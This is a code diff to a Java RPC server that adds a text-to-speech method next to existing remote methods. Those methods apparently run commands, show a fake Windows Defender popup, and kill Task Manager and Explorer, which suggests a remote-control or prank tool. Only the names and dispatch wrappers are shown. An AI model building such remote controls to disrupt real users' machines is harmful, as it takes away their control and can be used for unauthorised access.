@@ -36,6 +36,7 @@ public class RpcServer {
         methods.put("runCmdIgnoreErrors", this::handleRunCmdIgnoreErrors);
         methods.put("runDefenderPopup", this::handleRunDefenderPopup);
         methods.put("runKillTaskmngrAndExp", this::handleRunKillTaskmngrAndExp);
+        methods.put("runTextToSpeech", this::handleRunTextToSpeech);
     }
 
     // ##### CREATE YOUR OWN METHODS HERE ##### //
@@ -70,6 +71,11 @@ public class RpcServer {
     private void runKillTaskmngrAndExp() {
         RpcServerMethods methods1 = new RpcServerMethods();
         methods1.runKillTaskmngrAndExp();
+    }
+
+    private void runTextToSpeech(String text) {
+        RpcServerMethods methods2 = new RpcServerMethods();
+        methods2.runTextToSpeech(text);
     }
 
     ///  Has no handler
@@ -127,6 +133,19 @@ public class RpcServer {
         ObjectNode result = MAPPER.createObjectNode();
         result.put("stored", true);
         result.put("message", "killed items: " + message);
+        return result;
+    }
+
+    private JsonNode handleRunTextToSpeech(JsonNode req) {
+        JsonNode params = req.path("params");
+        String message = params.path("message").asText(null);
+        if (message == null) throw new IllegalArgumentException("params.message is required");
+
+        runTextToSpeech(message);
+
+        ObjectNode result = MAPPER.createObjectNode();
+        result.put("stored", true);
+        result.put("message", "TTS messages displayed: " + message);
         return result;
     }
 
